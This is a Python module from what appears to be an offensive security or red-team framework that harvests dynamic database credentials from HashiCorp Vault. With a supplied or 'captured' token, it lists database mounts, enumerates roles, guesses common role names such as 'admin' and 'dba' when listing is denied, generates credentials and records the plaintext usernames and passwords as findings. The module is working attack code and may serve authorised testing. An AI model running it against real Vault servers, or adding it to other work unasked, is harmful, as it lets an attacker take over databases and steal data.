from typing import Optional, Dict, Any, List
import requests
import json

from ...context import ExecutionContext
from ...registry import BaseExecutionModule, ExecutionResult, RiskLevel


TIMEOUT = 10

# Veritabanı bağlantıları için opsiyonel bağımlılıklar
try:
    import psycopg2
    PSYCOPG2_AVAILABLE = True
except ImportError:
    PSYCOPG2_AVAILABLE = False

try:
    import pymysql
    PYMYSQL_AVAILABLE = True
except ImportError:
    PYMYSQL_AVAILABLE = False

try:
    import pyodbc
    PYODBC_AVAILABLE = True
except ImportError:
    PYODBC_AVAILABLE = False


class DatabaseCredentialHarvestModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="database_credential_harvest.dynamic_creds",
            title="Database Credentials Harvest (dynamic)",
            risk_level=RiskLevel.STATE_CHANGING,
            domain="database",
            description=(
                "Harvests dynamic database credentials from Vault database mounts."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        """Require a Vault address and at least one token (token or captured_token)."""
        return bool(getattr(context, "vault_addr", None))

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        if not getattr(context, "vault_addr", None):
            return ExecutionResult(
                status="skipped",
                message="Missing vault_addr",
                evidence={"missing": ["vault_addr"]},
            )

        if not (getattr(context, "token", None) or getattr(context, "captured_token", None)):
            return ExecutionResult(
                status="skipped",
                message="Missing authentication (token or captured_token)",
                evidence={"missing": ["token or captured_token"]},
            )

        params = params or {}
        timeout = params.get("timeout", TIMEOUT)
        verify_tls = params.get("verify_tls", getattr(context, "verify_tls", True))

        # Prefer captured_token when available
        auth_token = getattr(context, "captured_token", None) or getattr(context, "token", None)
        headers = {"X-Vault-Token": auth_token}
        namespace = params.get("namespace", getattr(context, "namespace", None))
        if namespace:
            headers["X-Vault-Namespace"] = namespace

        try:
            mounts_url = f"{context.vault_addr.rstrip('/')}/v1/sys/mounts"
            resp = requests.get(mounts_url, headers=headers, timeout=timeout, verify=verify_tls)
        except requests.RequestException as e:
            return ExecutionResult(status="error", message=f"Network error: {e}", evidence={"error": str(e)})

        if resp.status_code != 200:
            return ExecutionResult(status="failed", message="Failed to list mounts", evidence={"db_mounts": []})

        mounts = resp.json().get("data", {})
        db_mounts: List[str] = []
        for mount_point, metadata in mounts.items():
            if metadata.get("type") == "database":
                db_mounts.append(mount_point.strip("/"))

        if not db_mounts:
            return ExecutionResult(status="failed", message="No database mounts found", evidence={"db_mounts": []})

        harvested: List[Dict[str, Any]] = []
        total = 0

        for mount in db_mounts:
            # LIST roles under the mount
            list_url = f"{context.vault_addr.rstrip('/')}/v1/{mount}/roles"
            try:
                list_resp = requests.request("LIST", list_url, headers=headers, timeout=timeout, verify=verify_tls)
            except requests.RequestException:
                continue

            if list_resp.status_code != 200:
                # Fallback: try common role names directly when LIST is denied.
                # Many tokens have read on database/creds/* but not list on
                # database/roles, so discovery via LIST fails but direct cred
                # generation still works.
                role_keys = _fallback_role_names(
                    context.vault_addr, mount, headers, timeout, verify_tls
                )
            else:
                role_keys = list_resp.json().get("data", {}).get("keys", [])

            for role in role_keys:
                # Get role metadata
                role_url = f"{context.vault_addr.rstrip('/')}/v1/{mount}/roles/{role}"
                try:
                    role_resp = requests.get(role_url, headers=headers, timeout=timeout, verify=verify_tls)
                except requests.RequestException:
                    role_resp = None

                role_data = {}
                if role_resp and role_resp.status_code == 200:
                    role_data = role_resp.json().get("data", {})

                creation_statements = role_data.get("creation_statements") or []

                # Request dynamic creds for the role
                creds_url = f"{context.vault_addr.rstrip('/')}/v1/{mount}/creds/{role}"
                try:
                    creds_resp = requests.get(creds_url, headers=headers, timeout=timeout, verify=verify_tls)
                except requests.RequestException:
                    creds_resp = None

                if not creds_resp or creds_resp.status_code != 200:
                    continue

                # Many responses include top-level lease_* keys and a 'data' dict
                resp_json = creds_resp.json()
                lease_duration = resp_json.get("lease_duration") or 0
                data_block = resp_json.get("data", {})
                username = data_block.get("username")
                password = data_block.get("password")

                if not username or not password:
                    continue

                high_priv = any(
                    "GRANT ALL" in stmt.upper() or "ALL PRIVILEGES" in stmt.upper()
                    for stmt in creation_statements
                )
                # Fallback: if role metadata was unreadable, guess from role name
                if not high_priv and not creation_statements:
                    high_priv = any(
                        keyword in role.lower()
                        for keyword in ("admin", "dba", "root", "super", "full")
                    )

                cred = {
                    "username": username,
                    "password": password,
                    "role": role,
                    "type": "dynamic",
                    "lease_duration_seconds": lease_duration,
                    "high_privilege": bool(high_priv),
                }

                harvested.append(cred)
                total += 1

                severity = "CRITICAL" if high_priv else "HIGH"
                context.add_finding(
                    title=f"{severity}: Database Credentials Harvested",
                    description=f"Harvested credentials for role '{role}' on mount '{mount}'.",
                    severity=severity,
                    evidence={"credentials": [cred]},
                )

        if not harvested:
            return ExecutionResult(status="failed", message="No credentials harvested", evidence={"db_mounts": db_mounts, "credentials": []})

        evidence = {"total_harvested": total, "credentials": harvested}
        return ExecutionResult(status="success", message=f"Harvested {total} credentials.", evidence=evidence)


def _fallback_role_names(vault_addr, mount, headers, timeout, verify_tls):
    """Try common database role names when LIST on roles is denied.

    Many least-privilege tokens have ``read`` on ``database/creds/*`` but
    not ``list`` on ``database/roles``.  This fallback directly attempts
    credential generation for well-known role names — if the API returns
    credentials (HTTP 200), the role exists and the token can use it.
    """
    import requests as _r
    base_url = vault_addr.rstrip("/")
    mount_path = mount.strip("/")
    common_roles = [
        "app-admin", "app-readonly", "readonly", "admin",
        "fullaccess", "dba", "app", "dev", "readwrite",
    ]
    found = []
    for role in common_roles:
        # Try credential generation directly — tokens with database/creds/*
        # can generate creds even when they cannot list roles or read role metadata.
        url = f"{base_url}/v1/{mount_path}/creds/{role}"
        try:
            resp = _r.get(url, headers=headers, timeout=timeout, verify=verify_tls)
            if resp.status_code == 200:
                found.append(role)
        except _r.RequestException:
            pass
    return found